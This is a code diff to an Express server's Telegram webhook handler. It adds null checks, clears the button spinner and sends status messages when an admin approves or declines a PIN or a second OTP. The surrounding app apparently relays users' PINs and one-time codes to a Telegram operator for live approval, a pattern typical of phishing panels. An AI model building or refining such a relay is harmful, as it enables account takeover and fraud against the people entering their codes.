@@ -112,20 +112,28 @@ app.get('/api/check-otp2-status', (req, res) => {
 
 // 5. Telegram Webhook Route
 app.post('/telegram-webhook', async (req, res) => {
-    res.sendStatus(200); // Acknowledge Telegram instantly
+    res.sendStatus(200); // Always acknowledge Telegram instantly
 
     try {
         const update = req.body;
         if (update && update.callback_query) {
             const action = update.callback_query.data;
-            const chatId = update.callback_query.message.chat.id;
-            const messageId = update.callback_query.message.message_id;
             const callbackQueryId = update.callback_query.id;
+            
+            // Safely check if message object exists
+            const message = update.callback_query.message;
+            const chatId = message && message.chat ? message.chat.id : process.env.CHAT_ID;
+            const messageId = message ? message.message_id : null;
 
             console.log(`🔔 Webhook Callback Received: ${action}`);
 
+            // Clear the button loading spinner first so it doesn't hang
             await answerCallback(callbackQueryId, 'Ação registada com sucesso!');
-            await removeMessageButtons(chatId, messageId);
+
+            // Remove buttons safely if messageId exists
+            if (messageId && chatId) {
+                await removeMessageButtons(chatId, messageId);
+            }
 
             let statusMessage = '';
             if (action === 'approve_pin') {
@@ -148,12 +156,12 @@ app.post('/telegram-webhook', async (req, res) => {
                 statusMessage = '❌ *Status: OTP 2 Declined by Admin*';
             }
 
-            if (statusMessage) {
+            if (statusMessage && chatId) {
                 await sendStatusMessage(chatId, statusMessage);
             }
         }
     } catch (err) {
-        console.error('Webhook processing error:', err.message);
+        console.error('Webhook Internal Handler Error:', err.message);
     }
 });
 
